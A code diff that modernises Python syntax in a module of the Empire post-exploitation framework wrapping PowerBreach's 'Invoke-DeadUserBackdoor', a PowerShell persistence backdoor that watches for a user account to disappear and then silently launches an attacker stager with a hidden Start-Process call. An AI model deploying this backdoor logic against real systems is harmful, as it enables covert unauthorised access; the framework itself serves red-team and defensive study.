@@ -1,7 +1,4 @@
-from __future__ import print_function
-
 import os
-from builtins import object, str
 from typing import Dict
 
 from empire.server.common import helpers
@@ -9,7 +6,7 @@ from empire.server.core.module_models import EmpireModule
 from empire.server.utils.module_util import handle_error_message
 
 
-class Module(object):
+class Module:
     @staticmethod
     def generate(
         main_menu,
@@ -21,7 +18,7 @@ class Module(object):
         script = """
 function Invoke-DeadUserBackdoor
 {
-    Param(  
+    Param(
     [Parameter(Mandatory=$False,Position=1)]
     [int]$Timeout=0,
     [Parameter(Mandatory=$False,Position=2)]
@@ -31,7 +28,7 @@ function Invoke-DeadUserBackdoor
     [Parameter(Mandatory=$False,Position=4)]
     [switch] $Domain
     )
-    
+
     $running=$True
     $match =""
     $starttime = Get-Date
@@ -40,7 +37,7 @@ function Invoke-DeadUserBackdoor
         if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))
         {
             $running=$False
-        }        
+        }
         if($Domain)
         {
             $UserSearcher = [adsisearcher]"(&(samAccountType=805306368)(samAccountName=*$UserName*))"
@@ -71,7 +68,7 @@ function Invoke-DeadUserBackdoor
         {
             Start-Sleep -s $Sleep
         }
-    }   
+    }
 }
 Invoke-DeadUserBackdoor"""
 
@@ -132,9 +129,8 @@ Invoke-DeadUserBackdoor"""
         parts = stager_code.split(" ")
 
         # set up the start-process command so no new windows appears
-        script = (
-            "Start-Process -NoNewWindow -FilePath '%s' -ArgumentList '%s'; 'PowerBreach Invoke-DeadUserBackdoor started'"
-            % (parts[0], " ".join(parts[1:]))
+        script = "Start-Process -NoNewWindow -FilePath '{}' -ArgumentList '{}'; 'PowerBreach Invoke-DeadUserBackdoor started'".format(
+            parts[0], " ".join(parts[1:])
         )
 
         script = main_menu.modulesv2.finalize_module(
